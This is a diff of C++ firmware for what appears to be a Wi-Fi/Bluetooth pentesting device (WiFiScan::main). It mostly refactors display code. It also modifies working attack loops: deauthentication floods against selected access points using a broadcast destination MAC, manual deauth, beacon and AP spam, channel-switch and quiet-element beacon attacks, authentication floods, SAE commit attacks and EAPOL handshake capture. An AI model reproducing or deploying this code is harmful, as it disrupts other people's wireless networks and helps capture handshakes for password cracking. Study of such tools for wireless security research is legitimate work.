@@ -11204,7 +11400,11 @@ void WiFiScan::main(uint32_t currentTime)
         }
         else {
           if (WiFi.scanComplete() != WIFI_SCAN_RUNNING) {
-            pBLEScan->start(0, scanCompleteCB, false);
+            #ifdef HAS_NIMBLE_2
+              pBLEScan->start(0, false, false); // Scan is in MS
+            #else
+              pBLEScan->start(0, scanCompleteCB, false);
+            #endif
             this->ble_scanning = true;
             return;
           }
@@ -11323,7 +11523,8 @@ void WiFiScan::main(uint32_t currentTime)
   }
   else if ((currentScanMode == WIFI_SCAN_CHAN_ANALYZER) ||
           (currentScanMode == BT_SCAN_ANALYZER)) {
-    this->channelAnalyzerLoop(currentTime);
+    //this->channelAnalyzerLoop(currentTime);
+    this->signalAnalyzerLoop(currentTime);
 
     if (currentScanMode == BT_SCAN_ANALYZER) {
       #ifdef HAS_BT
@@ -11344,6 +11545,10 @@ void WiFiScan::main(uint32_t currentTime)
   }
   else if ((currentScanMode == WIFI_SCAN_PACKET_RATE) ||
             (currentScanMode == WIFI_SCAN_RAW_CAPTURE)) {
+    if (currentTime - chanActTime >= 100) {
+      chanActTime = millis();
+      this->channelHop();
+    }
     this->packetRateLoop(currentTime);
   }
   else if ((currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM) ||
@@ -11432,7 +11637,9 @@ void WiFiScan::main(uint32_t currentTime)
       if (this->ep_deauth) {
         for (int i = 0; i < access_points->size(); i++) {
           if (access_points->get(i).selected) {
-            this->sendDeauthFrame(access_points->get(i).bssid, access_points->get(i).channel);
+            uint8_t dst_mac_bytes[6];
+            convertMacStringToUint8("ff:ff:ff:ff:ff:ff", dst_mac_bytes);
+            this->sendDeauthFrame(access_points->get(i).bssid, access_points->get(i).channel, dst_mac_bytes);
           }
         }
       }
@@ -11454,55 +11661,32 @@ void WiFiScan::main(uint32_t currentTime)
   else if ((currentScanMode == WIFI_SCAN_EAPOL) ||
           (currentScanMode == WIFI_SCAN_ACTIVE_EAPOL))
   {
-    #ifdef HAS_SCREEN
-      #ifdef HAS_ILI9341
-        eapolMonitorMain(currentTime);
-      #endif
-    #endif
+    //#ifndef HAS_SCREEN
+      if (currentTime - initTime >= 2000) {
+        initTime = millis();
+        this->channelHop();
+      }
+    //#endif
+
+    this->packetRateLoop(currentTime);
   }
-  /*else if (currentScanMode == WIFI_SCAN_ACTIVE_EAPOL)
-  {
-    #ifdef HAS_SCREEN
-      eapolMonitorMain(currentTime);
-    #endif
-  }*/
   else if (currentScanMode == WIFI_SCAN_ACTIVE_LIST_EAPOL) {
     if (currentTime - initTime >= 1000) {
       initTime = millis();
       this->channelHop(true);
     }
-    #ifdef HAS_SCREEN
-      eapolMonitorMain(currentTime);
-    #endif    
+    //#ifdef HAS_SCREEN
+    //  eapolMonitorMain(currentTime);
+    //#endif
+    this->packetRateLoop(currentTime); 
   }
-  /*else if ((currentScanMode == BT_SCAN_SIMPLE) || (currentScanMode == BT_SCAN_SIMPLE_TWO)) {
-    if (currentTime - initTime >= 1000) {
-      initTime = millis();
-      String displayString = "BT Frames: ";
-      displayString.concat(this->bt_frames);
-      #ifdef HAS_SCREEN
-        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
-      #endif
-    }
-  }*/
   else if (currentScanMode == WIFI_ATTACK_AUTH) {
     for (int i = 0; i < 55; i++)
       this->sendProbeAttack(currentTime);
 
     if (currentTime - initTime >= 1000) {
       initTime = millis();
-      String displayString = "";
-      String displayString2 = "";
-      displayString.concat(text18);
-      displayString.concat(packets_sent);
-      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
-        displayString2.concat(" ");
-      #ifdef HAS_SCREEN
-        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
-        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
-      #endif
+      this->displayTransmitRate();
       packets_sent = 0;
     }
   }
@@ -11514,17 +11698,7 @@ void WiFiScan::main(uint32_t currentTime)
 
     
       initTime = millis();
-      String displayString = "";
-      String displayString2 = "";
-      //displayString.concat(text18);
-      displayString.concat(packets_sent);
-      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
-        displayString2.concat(" ");
-      #ifdef HAS_SCREEN
-        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
-        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
-      #endif
+      this->displayTransmitRate();
       //packets_sent = 0;
     }
   }
@@ -11535,24 +11709,22 @@ void WiFiScan::main(uint32_t currentTime)
 
     
       initTime = millis();
-      String displayString = "";
-      String displayString2 = "";
-      displayString.concat(packets_sent);
-      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
-        displayString2.concat(" ");
-      #ifdef HAS_SCREEN
-        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
-        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
-      #endif
+      this->displayTransmitRate();
     }
   }
   else if (currentScanMode == WIFI_ATTACK_SAE_COMMIT) {
     this->saeAttackLoop(currentTime);
   }
   else if (currentScanMode == WIFI_ATTACK_DEAUTH) {
-    for (int i = 0; i < 55; i++) {
-      this->sendDeauthAttack(currentTime, this->dst_mac);
+    uint8_t dst_mac_bytes[6];
+    convertMacStringToUint8(this->dst_mac, dst_mac_bytes);
+    for (int i = 0; i < access_points->size(); i++) {
+      if (access_points->get(i).selected) {
+        for (int i = 0; i < 55; i++) {
+          //this->sendDeauthAttack(currentTime, this->dst_mac);
+          this->sendDeauthFrame(access_points->get(i).bssid, access_points->get(i).channel, dst_mac_bytes);
+        }
+      }
     }
 
     if (currentTime - initTime >= 1000) {
@@ -11580,22 +11752,16 @@ void WiFiScan::main(uint32_t currentTime)
   }
 
   else if (currentScanMode == WIFI_ATTACK_DEAUTH_MANUAL) {
-    for (int i = 0; i < 55; i++)
-      this->sendDeauthFrame(this->src_mac, this->set_channel, this->dst_mac);
+    uint8_t dst_mac_bytes[6];
+    convertMacStringToUint8(this->dst_mac, dst_mac_bytes);
+    for (int i = 0; i < 55; i++) {
+      //this->sendDeauthFrame(this->src_mac, this->set_channel, this->dst_mac);
+      this->sendDeauthFrame(this->src_mac, this->set_channel, dst_mac_bytes);
+    }
 
     if (currentTime - initTime >= 1000) {
       initTime = millis();
-      String displayString = "";
-      String displayString2 = "";
-      displayString.concat(text18);
-      displayString.concat(packets_sent);
-      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
-        displayString2.concat(" ");
-      #ifdef HAS_SCREEN
-        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
-        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
-      #endif
+      this->displayTransmitRate();
       packets_sent = 0;
     }
   }
@@ -11618,17 +11784,7 @@ void WiFiScan::main(uint32_t currentTime)
             // Display packets sent on screen
             if (currentTime - initTime >= 1000) {
               initTime = millis();
-              String displayString = "";
-              String displayString2 = "";
-              displayString.concat(text18);
-              displayString.concat(packets_sent);
-              for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
-                displayString2.concat(" ");
-              #ifdef HAS_SCREEN
-                display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-                display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
-                display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
-              #endif
+              this->displayTransmitRate();
               packets_sent = 0;
             }
           }
@@ -11636,7 +11792,7 @@ void WiFiScan::main(uint32_t currentTime)
       }
     }
   }
-  else if ((currentScanMode == WIFI_ATTACK_MIMIC)) {
+  /*else if ((currentScanMode == WIFI_ATTACK_MIMIC)) {
     // Need this for loop because getTouch causes ~10ms delay
     // which makes beacon spam less effective
     for (int i = 0; i < access_points->size(); i++) {
@@ -11678,30 +11834,26 @@ void WiFiScan::main(uint32_t currentTime)
       #endif
       packets_sent = 0;
     }
-  }
+  }*/
   else if ((currentScanMode == WIFI_ATTACK_BEACON_SPAM))
   {
     // Need this for loop because getTouch causes ~10ms delay
     // which makes beacon spam less effective
-    for (int i = 0; i < 55; i++)
-      broadcastRandomSSID(currentTime);
+    //for (int i = 0; i < 55; i++)
+    broadcastRandomSSID(currentTime);
 
     if (currentTime - initTime >= 1000)
     {
+      //#ifndef HAS_DUAL_BAND
+        set_channel = random(1,12); 
+      //#else
+      //  set_channel = dual_band_channels[random(0, DUAL_BAND_CHANNELS)];
+      //#endif
+      //set_channel = 6; // REMOVE THIS
+      this->changeChannel(this->set_channel);
+      delay(1);
       initTime = millis();
-      //Serial.print("packets/sec: ");
-      //Serial.println(packets_sent);
-      String displayString = "";
-      String displayString2 = "";
-      displayString.concat(text18);
-      displayString.concat(packets_sent);
-      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
-        displayString2.concat(" ");
-      #ifdef HAS_SCREEN
-        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
-        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
-      #endif
+      this->displayTransmitRate();
       packets_sent = 0;
     }
   }
@@ -11712,28 +11864,21 @@ void WiFiScan::main(uint32_t currentTime)
     if (currentTime - initTime >= 1000)
     {
       initTime = millis();
-      String displayString = "";
-      String displayString2 = "";
-      displayString.concat(text18);
-      displayString.concat(packets_sent);
-      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
-        displayString2.concat(" ");
-      #ifdef HAS_SCREEN
-        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
-        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
-      #endif
+      this->displayTransmitRate();
       packets_sent = 0;
     }
   }
-  else if ((currentScanMode == WIFI_ATTACK_AP_SPAM)) {
+  else if ((currentScanMode == WIFI_ATTACK_AP_SPAM) ||
+           (currentScanMode == WIFI_ATTACK_CSA) ||
+           (currentScanMode == WIFI_ATTACK_QUIET)) {
     for (int i = 0; i < access_points->size(); i++) {
       if (access_points->get(i).selected)
-        this->broadcastCustomBeacon(currentTime, access_points->get(i));
+        this->broadcastCustomBeacon(currentTime, access_points->get(i), currentScanMode);
     }
 
     if (currentTime - initTime >= 1000) {
       initTime = millis();
+      this->displayTransmitRate();
       packets_sent = 0;
     }
   }
@@ -11753,17 +11898,7 @@ void WiFiScan::main(uint32_t currentTime)
       initTime = millis();
       //Serial.print("packets/sec: ");
       //Serial.println(packets_sent);
-      String displayString = "";
-      String displayString2 = "";
-      displayString.concat(text18);
-      displayString.concat(packets_sent);
-      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
-        displayString2.concat(" ");
-      #ifdef HAS_SCREEN
-        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
-        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
-      #endif
+      this->displayTransmitRate();
       packets_sent = 0;
     }
   }
@@ -11783,17 +11918,7 @@ void WiFiScan::main(uint32_t currentTime)
       initTime = millis();
       //Serial.print("packets/sec: ");
       //Serial.println(packets_sent);
-      String displayString = "";
-      String displayString2 = "";
-      displayString.concat(text18);
-      displayString.concat(packets_sent);
-      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
-        displayString2.concat(" ");
-      #ifdef HAS_SCREEN
-        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
-        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
-        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
-      #endif
+      this->displayTransmitRate();
       packets_sent = 0;
     }
   }
